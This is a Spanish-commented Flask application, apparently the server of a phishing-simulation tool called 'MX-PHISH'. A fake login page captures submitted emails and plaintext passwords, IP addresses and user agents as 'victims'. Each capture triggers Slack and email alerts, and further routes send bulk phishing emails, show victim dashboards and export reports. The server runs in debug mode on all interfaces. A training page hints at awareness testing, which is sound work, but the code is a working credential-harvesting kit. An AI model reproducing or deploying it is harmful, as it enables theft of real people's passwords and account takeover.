from flask import Flask, render_template, request, redirect, url_for, jsonify, send_file
from database import db, Victim, Campaign
from smtp_sender import send_phishing_email
from auth import auth
from rate_limiter import limiter, email_rate_limiter
from pdf_export import generate_report_pdf
from notifiers.email_reporter import EmailReporter, send_quick_report
from notifiers.slack_notifier import slack, send_slack_alert, send_slack_summary
from dotenv import load_dotenv
import os
from datetime import datetime, timedelta
import json
import threading

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///phish_sim.db'
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY')
db.init_app(app)
limiter.init_app(app)

# Crear tablas
with app.app_context():
    db.create_all()

# Ruta principal (login falso)
@app.route('/')
def index():
    return render_template('login.html')

# Captura de credenciales (CON NOTIFICACIONES)
@app.route('/login', methods=['POST'])
def fake_login():
    email = request.form['email']
    password = request.form['password']
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    victim = Victim(
        email=email,
        password=password,
        ip=ip,
        user_agent=user_agent
    )
    db.session.add(victim)
    db.session.commit()
    
    # ACTUALIZAR CAMPAÑA
    campaign = Campaign.query.first()
    if campaign:
        campaign.click_count += 1
        db.session.commit()
    
    # 🔔 ENVIAR NOTIFICACIONES EN TIEMPO REAL
    # Notificación a Slack
    threading.Thread(target=send_slack_alert, args=(victim,)).start()
    
    # Opcional: email para alertas críticas (si hay muchas víctimas)
    victim_count = Victim.query.count()
    if victim_count % 10 == 0:  # Cada 10 víctimas
        stats = {
            'total_victims': victim_count,
            'new_victims': 1,
            'total_campaigns': Campaign.query.count(),
            'total_clicks': campaign.click_count if campaign else 0,
            'conversion_rate': round(victim_count / (campaign.sent_count or 1) * 100, 2)
        }
        reporter = EmailReporter()
        threading.Thread(target=reporter.send_report, args=(stats, [victim], "instant")).start()
    
    return render_template('training.html', email=email)

# DASHBOARD (protegido)
@app.route('/dashboard')
@auth.login_required
def dashboard():
    victims = Victim.query.all()
    campaigns = Campaign.query.all()
    
    # Datos para gráficas
    daily_data = {}
    for v in victims:
        date_str = v.timestamp.strftime('%Y-%m-%d')
        daily_data[date_str] = daily_data.get(date_str, 0) + 1
    
    # Calcular víctimas hoy
    today = datetime.now().date()
    new_victims_today = sum(1 for v in victims if v.timestamp.date() == today)
    
    stats = {
        'total_victims': len(victims),
        'total_campaigns': len(campaigns),
        'total_clicks': sum(c.click_count for c in campaigns),
        'new_victims_today': new_victims_today,
        'recent_victims': victims[-10:][::-1],
        'daily_data': json.dumps(daily_data),
        'labels': json.dumps(list(daily_data.keys())),
        'values': json.dumps(list(daily_data.values()))
    }
    return render_template('dashboard.html', stats=stats, victims=victims)

# API para estadísticas
@app.route('/api/stats')
@auth.login_required
def api_stats():
    victims_count = Victim.query.count()
    today = datetime.now().date()
    new_today = Victim.query.filter(Victim.timestamp >= today).count()
    campaign = Campaign.query.first()
    sent_count = campaign.sent_count if campaign else 0
    
    return jsonify({
        'total_caidos': victims_count,
        'nuevos_hoy': new_today,
        'total_envios': sent_count,
        'tasa_conversion': round(victims_count / (sent_count or 1) * 100, 2),
        'timestamp': datetime.now().isoformat()
    })

# NUEVO: Enviar reporte manual por email
@app.route('/send_report', methods=['POST'])
@auth.login_required
def send_report():
    period = request.json.get('period', 'daily')
    victims = Victim.query.all()
    today = datetime.now().date()
    new_victims = sum(1 for v in victims if v.timestamp.date() == today)
    campaign = Campaign.query.first()
    
    stats = {
        'total_victims': len(victims),
        'new_victims': new_victims,
        'total_campaigns': Campaign.query.count(),
        'total_clicks': campaign.click_count if campaign else 0,
        'conversion_rate': round(len(victims) / (campaign.sent_count or 1) * 100, 2)
    }
    
    reporter = EmailReporter()
    success = reporter.send_report(stats, victims[-20:], period)
    return jsonify({'success': success, 'message': 'Reporte enviado' if success else 'Error al enviar'})

# NUEVO: Probar conexión con Slack
@app.route('/test_slack', methods=['GET'])
@auth.login_required
def test_slack():
    success = slack.send_message("🧪 *Test de conexión MX-PHISH* - La integración con Slack funciona correctamente!", color="good")
    return jsonify({'success': success, 'message': 'Test enviado a Slack' if success else 'Error de conexión'})

# Envío masivo con rate limiting
@app.route('/send_campaign', methods=['POST'])
@auth.login_required
@limiter.limit("10 per minute")
def send_campaign():
    data = request.json
    targets = data.get('targets', [])
    
    results = {
        'sent': 0,
        'failed': 0,
        'errors': []
    }
    
    for target in targets[:100]:
        can_send, message = email_rate_limiter.can_send()
        if not can_send:
            results['errors'].append(f"Rate limit: {message}")
            break
        
        success = send_phishing_email(target['email'], target['name'], "http://localhost:5000/track")
        if success:
            results['sent'] += 1
            email_rate_limiter.record_send()
        else:
            results['failed'] += 1
    
    # Notificar a Slack sobre la campaña
    if results['sent'] > 0:
        threading.Thread(target=slack.send_campaign_report, args=(data.get('campaign_name', 'Sin nombre'), results)).start()
    
    return jsonify(results)

# Exportar reporte PDF
@app.route('/export/pdf')
@auth.login_required
def export_pdf():
    victims = Victim.query.all()
    campaigns = Campaign.query.all()
    
    stats = {
        'total_victims': len(victims),
        'total_campaigns': len(campaigns),
        'total_clicks': sum(c.click_count for c in campaigns)
    }
    
    pdf_buffer = generate_report_pdf(stats, victims)
    return send_file(
        pdf_buffer,
        as_attachment=True,
        download_name=f"mxphish_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf",
        mimetype='application/pdf'
    )

# Programar reportes automáticos (opcional - usar APScheduler o cron)
@app.route('/schedule_reports', methods=['POST'])
@auth.login_required
def schedule_reports():
    """Activa reportes automáticos diarios a las 9 AM"""
    import schedule
    import time
    
    def daily_report_job():
        victims = Victim.query.all()
        today = datetime.now().date()
        new_victims = sum(1 for v in victims if v.timestamp.date() == today)
        campaign = Campaign.query.first()
        
        stats = {
            'total_victims': len(victims),
            'new_victims': new_victims,
            'total_campaigns': Campaign.query.count(),
            'total_clicks': campaign.click_count if campaign else 0,
            'conversion_rate': round(len(victims) / (campaign.sent_count or 1) * 100, 2)
        }
        
        # Enviar reporte por email
        reporter = EmailReporter()
        reporter.send_report(stats, victims[-30:], "daily")
        
        # Enviar resumen a Slack
        send_slack_summary(stats)
    
    schedule.every().day.at("09:00").do(daily_report_job)
    
    # Ejecutar en hilo separado
    def run_scheduler():
        while True:
            schedule.run_pending()
            time.sleep(60)
    
    threading.Thread(target=run_scheduler, daemon=True).start()
    
    return jsonify({'success': True, 'message': 'Reportes automáticos programados para las 9:00 AM'})

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
